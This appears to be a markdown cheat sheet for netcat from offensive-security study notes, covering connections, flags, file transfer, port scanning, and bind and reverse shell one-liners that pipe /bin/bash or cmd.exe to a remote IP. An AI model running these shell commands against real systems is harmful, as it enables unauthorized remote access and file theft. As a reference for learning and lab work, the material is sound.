# netcat 

* ***connect to tcp/udp***

```shell
nc -nv 192.168.10.1 22 
```

<img width="484" alt="Screen Shot 2021-12-04 at 12 41 22" src="https://user-images.githubusercontent.com/92652606/144708154-7efd6863-8ec7-4e78-90da-e002e3a6ee2f.png">

* ***command flags***
```
-l: Listen mode 
-L: Listen harder ( WINDOWS VERSION ).
-u: UDP 
-p: Local port 
-e: Program to execute after connection occurs ( cmd.exe , /bin/bash .....)
-n: Don’t perform DNS lookups on names of machines on the other side
-z: Zero-I/O mode (Don’t send any data, just emit a packet without payload)
-wN: Timeout for connects, waits for N seconds after closure of STDIN. 
-v: verbose mode .
-vv: Be very verbose .
```

* ***Listening on a tcp/udp***

```shell
nc -nvlp 1337

```

* ***File Transfer***

```shell
nc -nvlp 1337 > out_file.txt
```
```shell
nc -nv 10.10.10.10 1337 < ~/home/mastermind/in_file.txt
```
<img width="526" alt="Screen Shot 2021-12-04 at 12 50 00" src="https://user-images.githubusercontent.com/92652606/144708388-eb063c87-bb6f-4066-a4dc-3f103a448388.png">

<img width="1007" alt="Screen Shot 2021-12-04 at 12 50 14" src="https://user-images.githubusercontent.com/92652606/144708394-ca2bceba-e964-474f-86bc-e0bec0aab84c.png">


* ***bind shell*** 
```shell
nc -lnvp 1337 -e cmd.exe
```

```shell
nc -nv target_ip port 
```

* ***Reverse Shell***
```shell
nc -lnvp 1337 
```
```shell
nc -nv 10.10.10.10 1337 -e /bin/bash
```

<img width="994" alt="Screen Shot 2021-12-04 at 13 01 19" src="https://user-images.githubusercontent.com/92652606/144708667-0e60b43e-311d-41d0-990b-e3f2076b49c7.png">

<img width="665" alt="Screen Shot 2021-12-04 at 13 01 38" src="https://user-images.githubusercontent.com/92652606/144708679-bd36bd3a-b07a-4993-b48a-4a1e87c4ab92.png">

* ***Port Scanner***

```shell
nc -nvz -w3 10.10.10.10 100-120  # 100-120 ip range
```
<img width="615" alt="Screen Shot 2021-12-04 at 13 24 58" src="https://user-images.githubusercontent.com/92652606/144709287-90d66ec8-948e-4dfd-b978-5b9b6eff4d2e.png">

